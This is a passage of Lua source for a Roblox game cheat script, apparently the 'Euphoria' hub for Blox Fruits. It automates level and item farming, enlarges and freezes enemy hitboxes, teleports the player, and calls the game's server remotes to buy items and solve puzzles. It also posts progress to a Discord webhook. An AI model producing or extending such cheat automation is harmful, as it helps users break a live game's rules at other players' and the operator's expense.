        if getgenv().EuphoriaSettings['Max Level'] then
            _G.MaxLevel = getgenv().EuphoriaSettings['Max Level']
            MaxLevelDropdown:UpdateSelect(tostring(getgenv().EuphoriaSettings['Max Level']))
        end

        if _G.MaxLevel and _G.MaxLevel > 0 then
            spawn(function()
                doneLeveling = false
                while wait() do
                    pcall(function()
                        if _G.MaxLevel == 700 or tostring(_G.MaxLevel) == '700' then
                            if second_sea then
                                doneLeveling = true
                            end
                        else
                            if LP.Data.Level.Value >= _G.MaxLevel then
                                doneLeveling = true
                            end
                        end
                    end)
                    if doneLeveling then
                        autoFarmLevel:UpdateToggle(nil, false)
                        _G.AntiAFK = false
                        _G.AntiCheat = false
                        _G.AutoRejoinServer = false
                        getgenv().EuphoriaSettings['Auto Rejoin'] = false
                        wait(.2)
                        st, err = pcall(function()
                            h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                            m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
                            s=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(1))%(60)
                            h=(string.len(h)==1 and "0"..h or h)
                            m=(string.len(m)==1 and "0"..m or m)
                            s=(string.len(s)==1 and "0"..s or s)
                            time = "Online Time: "..h..":"..m..":"..s

                            local Embed = {
                                ["title"] = LP.Name,
                                ["description"] = "**Reached **`" .. tostring(_G.MaxLevel) .. "` **level!\nScript will be automatically stopped\n**```\n" .. time .. "\n```",
                                ["type"] = "rich",
                                ["color"] = tonumber(0xffffff),
                                ["footer"] = {
                                    ["text"] = "e u p h o r i a =3",
                                }
                            };
                            sendWebhook(
                                webhook['level_webhook'],
                                "@here",
                                Embed 
                            )
                        end)
                        LP:Kick("Leveling Done!")
                        return 
                    end
                end
            end)
        end


        _G.SelectWeapon = _G.SelectWeapon or getgenv().EuphoriaSettings["Select Weapon"] or "Melee"
        WeaponDropdown = MainFarmSection:NewDropdown("Select Weapon", {"Melee", "Sword", "Fruit"}, function(currentOption)
            getgenv().EuphoriaSettings["Select Weapon"] = currentOption
            WriteSettings()
            _G.SelectWeapon = currentOption
        end)
        if getgenv().EuphoriaSettings["Select Weapon"] then
            WeaponDropdown:UpdateSelect(getgenv().EuphoriaSettings["Select Weapon"])
        end
        
        local FarmTab = Window:NewTab("Farm")
        local FarmSection = FarmTab:NewSection("Farming")
        FarmBones = false
        FarmEctoplasm = false
        if first_sea then
            FarmSection:NewToggle("Do Second Sea", function(state)
                _G.DoSecondSea = state
            end)
        end
        if second_sea then
            EctoplasmLabel = FarmSection:NewLabel("🍼 Ectoplasm: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        EctoplasmLabel:UpdateLabel("🍼 Ectoplasm: " .. tostring(GetMaterial("Ectoplasm")))
                    end)
                end
            end)
            FarmEctoplasmToggle = FarmSection:NewToggle("Farm Ectoplasm", function(state)
                getgenv().EuphoriaSettings["Farm Ectoplasm"] = state
                WriteSettings()
                FarmEctoplasm = state
            end)
            if getgenv().EuphoriaSettings["Farm Ectoplasm"] then FarmEctoplasmToggle:UpdateToggle(nil, true) end
        end
        if third_sea then
            BonesLabel = FarmSection:NewLabel("💀 Bones: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        BonesLabel:UpdateLabel("💀 Bones: " .. tostring(GetMaterial("Bones")))
                    end)
                end
            end)
            FarmBonesToggle = FarmSection:NewToggle("Farm Bones", function(state)
                getgenv().EuphoriaSettings["Farm Bones"] = state
                WriteSettings()
                FarmBones = state
            end)
            if getgenv().EuphoriaSettings["Farm Bones"] then FarmBonesToggle:UpdateToggle(nil, true) end
            FarmBonesToggleWithQuest = FarmSection:NewToggle("With Quest", function(state)
                getgenv().EuphoriaSettings["Farm Bones With Quest"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Bones With Quest"] then FarmBonesToggleWithQuest:UpdateToggle(nil, true) end
        end

        spawn(function()
            while task.wait() do
                if (FarmBones or FarmBonesCDK or FarmBonesGH) and third_sea then
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Bones With Quest"] and not LP.PlayerGui.Main.Quest.Visible then
                            if LP.Data.Level.Value >= 2050 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 2)
                            elseif LP.Data.Level.Value >= 2025 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 1)
                            elseif LP.Data.Level.Value >= 2000 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest1", 2)
                            elseif LP.Data.Level.Value >= 1975 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest1", 1)
                            end
                        end                                                                                                     
                        if game:GetService("Workspace").Enemies:FindFirstChild("Reborn Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Living Zombie") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                            target = getClosest({"Reborn Skeleton", "Living Zombie", "Demonic Soul", "Posessed Mummy"})
                            if target then
                                v = target
                                if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                    repeat task.wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = true
                                        PosMon = v.HumanoidRootPart.CFrame
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not FarmBones or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        else
                            pos = CFrame.new(-9515.04199, 210.81572, 5788.22217, -1, 4.91895875e-08, 0.000170758853, 4.91951333e-08, 1, 3.24608713e-08, -0.000170758853, 3.24692699e-08, -1)
                            useNearestEntrance(pos)
                            toPoint(pos)
                        end
                    end)
                end
            end
        end) 
        if first_sea or second_sea or third_sea then
            local MiscFarmItemsSection = FarmTab:NewSection("Misc farm")
            
            AutoSoulGuitar = MiscFarmItemsSection:NewToggle("Auto Soul Guitar [Need only Dark Fragment]", function(value)
                getgenv().EuphoriaSettings["Auto Soul Guitar"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Soul Guitar"] then AutoSoulGuitar:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Soul Guitar"] then _G.AutoSoulGuitar = true else _G.AutoSoulGuitar = false end
                    end)
                end
            end)

            SoulGuitarEctoplasm = false
            SoulGuitarBones = false
            SoulGuitarFrags = false
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if _G.AutoSoulGuitar and not isWeaponInInventory("Soul Guitar") then
                            if GetMaterial("Ectoplasm") < 250 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().EuphoriaSettings["killaura"] = false
                                    getgenv().EuphoriaSettings["autonextisland"] = false
                                    getgenv().EuphoriaSettings["autostartraid"] = false
                                    getgenv().EuphoriaSettings["autotradejunk"] = false
                                    getgenv().EuphoriaSettings["autobuychip"] = false
                                    getgenv().EuphoriaSettings["maxfrag"] = 0
                                    getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                                end
                                if SoulGuitarBones then
                                    SoulGuitarBones = false
                                    FarmBones = false
                                end
                                if not second_sea then
                                    teleportToSecondSea()
                                else
                                    SoulGuitarEctoplasm = true 
                                    FarmEctoplasm = true
                                end
                            elseif GetMaterial("Bones") < 500 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().EuphoriaSettings["killaura"] = false
                                    getgenv().EuphoriaSettings["autonextisland"] = false
                                    getgenv().EuphoriaSettings["autostartraid"] = false
                                    getgenv().EuphoriaSettings["autotradejunk"] = false
                                    getgenv().EuphoriaSettings["autobuychip"] = false
                                    getgenv().EuphoriaSettings["maxfrag"] = 0
                                    getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                                end
                                if SoulGuitarEctoplasm then
                                    SoulGuitarEctoplasm = false
                                    FarmEctoplasm = false
                                end
                                if not third_sea then
                                    teleportToThirdSea()
                                else
                                    SoulGuitarBones = true
                                    FarmBones = true
                                end
                            elseif LP.Data.Fragments.Value < 5000 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarBones then
                                    SoulGuitarBones = false
                                    FarmBones = false
                                end
                                if SoulGuitarEctoplasm then
                                    SoulGuitarEctoplasm = false
                                    FarmEctoplasm = false
                                end
                                SoulGuitarFrags = true
                                getgenv().EuphoriaSettings["killaura"] = true
                                getgenv().EuphoriaSettings["autonextisland"] = true
                                getgenv().EuphoriaSettings["autostartraid"] = true
                                getgenv().EuphoriaSettings["autotradejunk"] = true
                                getgenv().EuphoriaSettings["autobuychip"] = true
                                getgenv().EuphoriaSettings["maxfrag"] = 5000
                                getgenv().EuphoriaSettings["enabledmaxfrag"] = true
                            else
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().EuphoriaSettings["killaura"] = false
                                    getgenv().EuphoriaSettings["autonextisland"] = false
                                    getgenv().EuphoriaSettings["autostartraid"] = false
                                    getgenv().EuphoriaSettings["autotradejunk"] = false
                                    getgenv().EuphoriaSettings["autobuychip"] = false
                                    getgenv().EuphoriaSettings["maxfrag"] = 0
                                    getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                                end
                                if SoulGuitarBones then
                                    SoulGuitarBones = false
                                    FarmBones = false
                                end
                                if SoulGuitarEctoplasm then
                                    SoulGuitarEctoplasm = false
                                    FarmEctoplasm = false
                                end
                                if not third_sea then
                                    teleportToThirdSea()
                                else
                                    if game:GetService("Workspace").Map["Haunted Castle"].Candle1.Transparency ~= 0 then
                                        if ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2) and type(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)) == "string" and string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Error") then
                                            print("Go to Grave")
                                            toPoint(CFrame.new(-8653.03809, 141.131409, 6168.21777, -0.999985337, 3.62942778e-08, 0.00541123329, 3.5995388e-08, 1, -5.53324071e-08, -0.00541123329, -5.5136816e-08, -0.999985337))
                                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2) and type(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)) == "string" and string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Nothing") then
                                            print("Wait Next Night")
                                        else
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)
                                            wait(.1)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2,true)
                                            wait(.1)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                        end
                                    else
                                        guitarStatuses = ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                        local swamp = guitarStatuses.Swamp
                                        local gravestones = guitarStatuses.Gravestones
                                        local ghost = guitarStatuses.Ghost
                                        local trophies = guitarStatuses.Trophies
                                        local pipes = guitarStatuses.Pipes
                                        if swamp and gravestones and ghost and trophies and pipes then
                                            if GetMaterial("Dark Fragment") > 0 and GetMaterial("Ectoplasm") >= 250 and GetMaterial("Bones") >= 500 then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("soulGuitarBuy")
                                            end
                                        else
                                            if not swamp then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Swamp")
                                                UnEquip()
                                                repeat wait()
                                                    CharPosition = CFrame.new(-10166.5586, 214.012268, 5938.11133, -0.445710421, -3.74314659e-08, -0.895177186, -9.14189684e-08, 1, 3.70308828e-09, 0.895177186, 8.34866754e-08, -0.445710421)
                                                    KillPosition = CFrame.new(-10166.5586, 180.012268, 5938.11133, -0.445710421, -3.74314659e-08, -0.895177186, -9.14189684e-08, 1, 3.70308828e-09, 0.895177186, 8.34866754e-08, -0.445710421)
                                                    toPoint(CharPosition)
                                                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                        if v.Name == 'Living Zombie' then
                                                            UnEquip()
                                                            toPoint(CharPosition)
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            v.HumanoidRootPart.CFrame = KillPosition
                                                        end
                                                    end
                                                    count = 0
                                                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                        if v.Name == 'Living Zombie' then
                                                            if (v.HumanoidRootPart.CFrame.Position - KillPosition.Position).Magnitude < 15 then
                                                                count = count + 1
                                                                toPoint(CharPosition)
                                                            end
                                                        end
                                                    end
                                                    if count == 6 then
                                                        EquipWeapon(_G.SelectWeapon)
                                                        toPoint(CharPosition)
                                                        wait(5)
                                                    end
                                                until not _G.AutoSoulGuitar or game.Workspace.Map["Haunted Castle"].SwampWater.BrickColor ~= BrickColor.new("Maroon")
                                            elseif not gravestones then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Gravestones")
                                            elseif not ghost then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
                                                wait(.1)
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                            elseif not trophies then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Trophies")
                                            elseif not pipes then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Pipes")
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            if SoulGuitarFrags then
                                SoulGuitarFrags = false
                                getgenv().EuphoriaSettings["killaura"] = false
                                getgenv().EuphoriaSettings["autonextisland"] = false
                                getgenv().EuphoriaSettings["autostartraid"] = false
                                getgenv().EuphoriaSettings["autotradejunk"] = false
                                getgenv().EuphoriaSettings["autobuychip"] = false
                                getgenv().EuphoriaSettings["maxfrag"] = 0
                                getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                            end
                            if SoulGuitarBones then
                                SoulGuitarBones = false
                                FarmBones = false
                            end
                            if SoulGuitarEctoplasm then
                                SoulGuitarEctoplasm = false
                                FarmEctoplasm = false
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)
            
            AutoGodhuman = MiscFarmItemsSection:NewToggle("Auto Godhuman [Farm frags before]", function(state)
                getgenv().EuphoriaSettings["Auto Godhuman"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Godhuman"] then AutoGodhuman:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Godhuman"] then _G.AutoGodhuman = true else _G.AutoGodhuman = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoGodhuman then
                            if not _G.GodhumanInfo then
                                _G.GodhumanInfo = {}
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Black Leg") or LP.Character:FindFirstChild("Black Leg") then
                                    if LP.Backpack:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Backpack:FindFirstChild("Black Leg").Level.Value
                                    elseif LP.Character:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Character:FindFirstChild("Black Leg").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Black Leg"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Electro") or LP.Character:FindFirstChild("Electro") then
                                    if LP.Backpack:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Backpack:FindFirstChild("Electro").Level.Value
                                    elseif LP.Character:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Character:FindFirstChild("Electro").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Electro"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Fishman Karate") or LP.Character:FindFirstChild("Fishman Karate") then
                                    if LP.Backpack:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Backpack:FindFirstChild("Fishman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Character:FindFirstChild("Fishman Karate").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Fishman Karate"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Dragon Claw") or LP.Character:FindFirstChild("Dragon Claw") then
                                    if LP.Backpack:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Backpack:FindFirstChild("Dragon Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Character:FindFirstChild("Dragon Claw").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Dragon Claw"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman") 
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Superhuman") or LP.Character:FindFirstChild("Superhuman") then
                                    if LP.Backpack:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Backpack:FindFirstChild("Superhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Character:FindFirstChild("Superhuman").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Superhuman"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep",true)
							    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Death Step") or LP.Character:FindFirstChild("Death Step") then
                                    if LP.Backpack:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Backpack:FindFirstChild("Death Step").Level.Value
                                    elseif LP.Character:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Character:FindFirstChild("Death Step").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Death Step"] = false
                                end
                                
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")  
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Sharkman Karate") or LP.Character:FindFirstChild("Sharkman Karate") then
                                    if LP.Backpack:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Backpack:FindFirstChild("Sharkman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Character:FindFirstChild("Sharkman Karate").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Sharkman Karate"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Electric Claw") or LP.Character:FindFirstChild("Electric Claw") then
                                    if LP.Backpack:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Backpack:FindFirstChild("Electric Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Character:FindFirstChild("Electric Claw").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Electric Claw"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Dragon Talon") or LP.Character:FindFirstChild("Dragon Talon") then
                                    if LP.Backpack:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Backpack:FindFirstChild("Dragon Talon").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Character:FindFirstChild("Dragon Talon").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Dragon Talon"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Godhuman") or LP.Character:FindFirstChild("Godhuman") then
                                    if LP.Backpack:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Backpack:FindFirstChild("Godhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Character:FindFirstChild("Godhuman").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Godhuman"] = false
                                end
                            else
                                if LP.Backpack:FindFirstChild("Black Leg") or LP.Character:FindFirstChild("Black Leg") then
                                    if LP.Backpack:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Backpack:FindFirstChild("Black Leg").Level.Value
                                    elseif LP.Character:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Character:FindFirstChild("Black Leg").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Electro") or LP.Character:FindFirstChild("Electro") then
                                    if LP.Backpack:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Backpack:FindFirstChild("Electro").Level.Value
                                    elseif LP.Character:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Character:FindFirstChild("Electro").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Fishman Karate") or LP.Character:FindFirstChild("Fishman Karate") then
                                    if LP.Backpack:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Backpack:FindFirstChild("Fishman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Character:FindFirstChild("Fishman Karate").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Dragon Claw") or LP.Character:FindFirstChild("Dragon Claw") then
                                    if LP.Backpack:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Backpack:FindFirstChild("Dragon Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Character:FindFirstChild("Dragon Claw").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Superhuman") or LP.Character:FindFirstChild("Superhuman") then
                                    if LP.Backpack:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Backpack:FindFirstChild("Superhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Character:FindFirstChild("Superhuman").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Death Step") or LP.Character:FindFirstChild("Death Step") then
                                    if LP.Backpack:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Backpack:FindFirstChild("Death Step").Level.Value
                                    elseif LP.Character:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Character:FindFirstChild("Death Step").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Sharkman Karate") or LP.Character:FindFirstChild("Sharkman Karate") then
                                    if LP.Backpack:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Backpack:FindFirstChild("Sharkman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Character:FindFirstChild("Sharkman Karate").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Electric Claw") or LP.Character:FindFirstChild("Electric Claw") then
                                    if LP.Backpack:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Backpack:FindFirstChild("Electric Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Character:FindFirstChild("Electric Claw").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Dragon Talon") or LP.Character:FindFirstChild("Dragon Talon") then
                                    if LP.Backpack:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Backpack:FindFirstChild("Dragon Talon").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Character:FindFirstChild("Dragon Talon").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Godhuman") or LP.Character:FindFirstChild("Godhuman") then
                                    if LP.Backpack:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Backpack:FindFirstChild("Godhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Character:FindFirstChild("Godhuman").Level.Value
                                    end
                                end
                                    
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Black Leg") and _G.GodhumanInfo['Black Leg'] and _G.GodhumanInfo['Black Leg'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Black Leg") and not LP.Character:FindFirstChild("Black Leg") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Black Leg"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Black Leg'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Black Leg") or LP.Character:FindFirstChild("Black Leg") then
                                            if LP.Backpack:FindFirstChild("Black Leg") then
                                                _G.GodhumanInfo["Black Leg"] = LP.Backpack:FindFirstChild("Black Leg").Level.Value
                                            elseif LP.Character:FindFirstChild("Black Leg") then
                                                _G.GodhumanInfo["Black Leg"] = LP.Character:FindFirstChild("Black Leg").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Black Leg"] = false
                                        end
                                    else
